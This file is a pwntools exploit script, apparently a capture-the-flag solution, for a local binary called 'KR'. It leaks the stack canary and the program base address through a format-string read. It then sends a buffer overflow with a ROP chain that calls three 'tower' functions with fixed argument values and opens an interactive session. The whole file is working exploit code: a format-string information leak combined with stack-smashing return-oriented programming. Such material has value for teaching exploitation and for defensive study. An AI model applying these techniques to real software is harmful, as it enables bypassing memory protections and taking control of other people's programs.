from pwn import *

binary = './KR'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()
p.sendline(b'23')

#Leaking Canary
p.recv()
p.sendline(b'%19$p')
leak = p.recvline().strip().split(b' ')
canary = int(leak[1],16)
log.info(f'Canary: {hex(canary)}')

#Getting Base Address
p.recvuntil(b'armor ')
leak = p.recvline().strip()
base = int(leak,16) - 0x1423
log.info(f'Base: {hex(base)}')

#Getting everything needed
tower1 = base + 0x128c
tower2 = base + 0x12dd
maintower = base + 0x133b
rdi = base + 0x1210 # pop rdi ; ret
rsi = base + 0x122b # pop rsi ; ret
rdx = base + 0x1219 # pop rdx ; ret
rcx = base + 0x1222 # pop rcx ; ret
ret = rdi + 1

log.info(f'tower_1 : {hex(tower1)}')
log.info(f'tower_2 : {hex(tower2)}')
log.info(f'maintower : {hex(maintower)}')
log.info(f'rdi : {hex(rdi)}')
log.info(f'rsi : {hex(rsi)}')
log.info(f'rdx : {hex(rdx)}')
log.info(f'rcx : {hex(rcx)}')
log.info(f'ret : {hex(ret)}')

#Tower_1
payload = b'a'*72
payload+= p64(canary)
payload+= b'a'*8
payload+= p64(ret)
payload+= p64(rdi)
payload+= p64(0xbabeface)
payload+= p64(tower1)

#Tower 2
payload+= p64(ret)
payload+= p64(rdi)
payload+= p64(0xcafec0de)
payload+= p64(rsi)
payload+= p64(0xbeefface)
payload+= p64(tower2)

#Main Tower
payload+= p64(ret)
payload+= p64(rdi)
payload+= p64(0x1a2b3c4d)
payload+= p64(rsi)
payload+= p64(0xdeadca77)
payload+= p64(rdx)
payload+= p64(0xca77caf3)
payload+= p64(rcx)
payload+= p64(0xdeda8765)
payload+= p64(maintower)
p.sendline(payload)
p.interactive()


#print(p.recv())
